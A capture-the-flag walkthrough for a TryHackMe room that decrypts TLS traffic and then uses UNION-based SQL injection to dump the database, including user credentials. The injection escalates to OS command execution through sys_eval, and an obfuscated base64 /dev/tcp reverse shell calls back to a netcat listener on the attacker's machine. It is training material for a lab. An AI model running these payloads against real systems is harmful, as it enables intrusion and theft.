# TryHack3M: Sch3Ma D3Mon

**Room Link:** [https://tryhackme.com/r/room/sch3mad3mon](https://tryhackme.com/r/room/sch3mad3mon)

## A Public Computer with a VPN

goto Edit -> preferences -> protocols -> search for SSL or TLS -> select the ssl-key.log file and hit enter to decrypt the web traffic.



<figure><img src="../../.gitbook/assets/image (1092).png" alt=""><figcaption></figcaption></figure>

**Filter**

```
http contains "Username"
```

<figure><img src="../../.gitbook/assets/image (1093).png" alt=""><figcaption></figcaption></figure>

## Connected Tables

**Filter**

```
' union select 1,2,3,4,5 -- //
```



### Find Databse

**Filter**

```
' union select 1,2,3,4,database() -- //
```

<figure><img src="../../.gitbook/assets/image (1095).png" alt=""><figcaption></figcaption></figure>

### Find Tables

**Filter**

```
' union select 1,2,3,4,group_concat(table_name) from information_schema.tables WHERE table_schema = 'mayh3Mmarketplace'; -- //
```

<figure><img src="../../.gitbook/assets/image (1096).png" alt=""><figcaption></figcaption></figure>

### Get fields

**Filter**

```
' union select 1,2,3,4,group_concat(column_name) from information_schema.columns where table_name='users' -- //
```

<figure><img src="../../.gitbook/assets/image (1097).png" alt=""><figcaption></figcaption></figure>

### Get field info

Confirmed we're the only other user.

**Filter**

```
' union select 1,group_concat(username),group_concat(password),3,4 FROM users -- -
```

<figure><img src="../../.gitbook/assets/image (1098).png" alt=""><figcaption></figcaption></figure>

**Filter**

```
' union select 1,2,3,4,group_concat(column_name) from information_schema.columns where table_name='unlisted_products' -- //
```

<figure><img src="../../.gitbook/assets/image (1099).png" alt=""><figcaption></figcaption></figure>

**Filter**

```
' union select null,null,null,null, group_concat(product_name) from unlisted_products -- //
```

<figure><img src="../../.gitbook/assets/image (1100).png" alt=""><figcaption></figcaption></figure>

## From DB to OS

**URL**

```
http://10.10.26.7:8000/os_sqli.php?user=lannister' union SELECT null, null, null, null, sys_eval('whoami') -- //
```

<figure><img src="../../.gitbook/assets/image (1101).png" alt=""><figcaption></figcaption></figure>

**URL**

```
http://10.10.26.7:8000/os_sqli.php?user=lannister%27%20union%20SELECT%20null,%20null,%20null,%20null,%20sys_eval(%27pwd%27)%20--%20//
```

<figure><img src="../../.gitbook/assets/image (1102).png" alt=""><figcaption></figcaption></figure>

## Finding a Needle in a Malwarestack

We can see the files but if we cat them they get cut off.&#x20;

**URL**

```
http://10.10.61.64:8000/os_sqli.php?user=lannister%27%20union%20SELECT%20null,%20null,%20null,%20null,%20sys_eval(%27ls%20%20/home/receipts%27)%20--%20//
```

<figure><img src="../../.gitbook/assets/image (1103).png" alt=""><figcaption></figcaption></figure>

**URL**

```
' union select null,null,null,column_name,null from information_schema.columns where table_name='transactions' -- // 
```

<figure><img src="../../.gitbook/assets/image (1104).png" alt=""><figcaption></figcaption></figure>

**URL**

```
' union select null,null,null,null,group_concat(transaction_number, '::', bcoin_sender_address, '::', bcoin_recipient_address,'\n') from transactions -- //
```

<figure><img src="../../.gitbook/assets/image (1105).png" alt=""><figcaption></figcaption></figure>

**URL**

```
' union select null,null,null,sys_exec('touch /var/lib/mysql/my_file.txt'),null -- //
' union select null,null,null,sys_eval('ls -al /home/receipts/ > /var/lib/mysql/my_file.txt'),null -- //
' union select null,null,null,load_file('/var/lib/mysql/my_file.txt'),null -- // verify that our command able to load the file

' union select null,null,null,load_file('/home/receipts/3000000.txt.gpg'),null -- //
```

<figure><img src="../../.gitbook/assets/image (1106).png" alt=""><figcaption></figcaption></figure>

If you use Burp the output will be nicer to copy over.

<figure><img src="../../.gitbook/assets/image (1107).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (1108).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gpg --decrypt 3000000.txt.gpg
Passphrase: eqFN5vBg4n2t4xGsJF7BYNWMtTaVA1muES
```

<figure><img src="../../.gitbook/assets/image (1109).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>



## Operation Defang

<figure><img src="../../.gitbook/assets/image (1112).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 9001
```

**URL**

```
http://10.10.61.64:8000/os_sqli.php?user=lannister%27%20union%20SELECT%20null,%20null,%20null,%20null,%20sys_eval(%27echo%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2MS4xNDEvOTAwMSAwPiYx%20|%20base64%20-d%20%20|/bin/bash%27)%20--%20//
```



<figure><img src="../../.gitbook/assets/image (1113).png" alt=""><figcaption></figcaption></figure>

**Victim**&#x20;

```
script -qc /bin/bash /dev/null
ctrl + Z
stty raw -echo;fg
```



**Victim**&#x20;

```
cd /home/products/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0
ls 
```

<figure><img src="../../.gitbook/assets/image (1114).png" alt=""><figcaption></figcaption></figure>

After reading the code I saw that we can defang the code just by changing the config.ini file fto debug=true so we can run the code without having to worry about what will happen.

**Victim**&#x20;

```
echo "debug=true" > config.ini  
./build.sh 
```

<figure><img src="../../.gitbook/assets/image (1115).png" alt=""><figcaption></figcaption></figure>

